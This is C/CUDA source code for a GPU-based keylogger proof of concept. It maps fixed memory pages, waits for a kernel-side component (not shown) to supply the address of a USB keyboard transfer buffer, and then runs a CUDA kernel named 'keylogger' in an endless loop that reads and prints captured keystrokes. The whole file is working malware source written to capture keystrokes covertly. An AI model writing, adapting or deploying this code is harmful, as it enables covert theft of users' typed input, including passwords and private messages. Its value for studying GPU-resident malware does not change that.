#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <cuda_runtime.h>

#define WRITE_PAGE	0x40000000
#define SEND_BUFFER	0x50000000

__global__ void keylogger(unsigned long *A, unsigned long *B)
{
	B[0] = A[0];
}
int main(void)
{
	int i,offset;
	cudaError_t err = cudaSuccess;
	unsigned long *u_keybd_buf,*u_scan_buf;
	unsigned long *scan_buf,*keybd_buf;
	unsigned long *p, *p2;
	
	cudaSetDeviceFlags(cudaDeviceMapHost);
	cudaHostAlloc((void **)&scan_buf, 0x1000, cudaHostAllocMapped);

	// Allocat memory
	p = (unsigned long *)mmap((void *)WRITE_PAGE,0x1000,PROT_READ|PROT_WRITE,MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED,-1,NULL);  // modify page table
	p2 = (unsigned long *)mmap((void *)SEND_BUFFER,0x1000,PROT_READ|PROT_WRITE,MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED,-1,NULL);  // transfer_buffer

	// remove dummy data in memory (1)
	for( i = 0; i < 0x200; i++ ){
		p[i] = 0x7777777777777777;
		p2[i] = 0x7777777777777777;
	}
	
	// Wait until the kernel writes a urbp->transfer_buffer to this address.
	memset( p2, 0, 0x1000 );
	while( p2[0] == 0 ){
		usleep( 500000 );
	}
	
	// When a value is returned from the kernel, urbp->transfer_buffer stored in p2[0].
	printf("transfer_buffer : %llX\n", p2[0] );
	offset = p2[0] & 0xfff;
	// This mean is that p2 is not exist in host process memory.
	munmap(p2, 0x1000);

	// Allocate memory on the device.
	cudaMalloc(&u_scan_buf,512);	
	// Registers an existing host memory range for use by CUDA.
	cudaHostRegister((void *)WRITE_PAGE, 0x1000, cudaHostRegisterMapped);	
	
	// Passes back device pointer of mapped host memory allocated by cudaHostAlloc or registered by cudaHostRegister.
	cudaHostGetDevicePointer((void **)&u_keybd_buf,(void *)(WRITE_PAGE+offset),0);	// cudaHostGetDevicePointer ( void** pDevice, void* pHost, unsigned int  flags )
	
	// This mean is that p(keyboard_buffer) is not exist in host process memory.
	munmap(p, 0x1000);

	// Finally, Capturing Keystrokes
	while(1){
		keylogger<<<1, 1>>>(u_keybd_buf, u_scan_buf);
		cudaThreadSynchronize();
		err = cudaGetLastError();
		if (err != cudaSuccess){
	        	printf("Failed (error : %s)!\n", cudaGetErrorString(err));
	        	exit(EXIT_FAILURE);
    		}
		// Copies data between host and device.
		cudaMemcpy(scan_buf,u_scan_buf,8,cudaMemcpyDeviceToHost);
		printf("%llX\n",scan_buf[0]);
		usleep(80000);
	}
	cudaThreadExit();
	return 0;
}

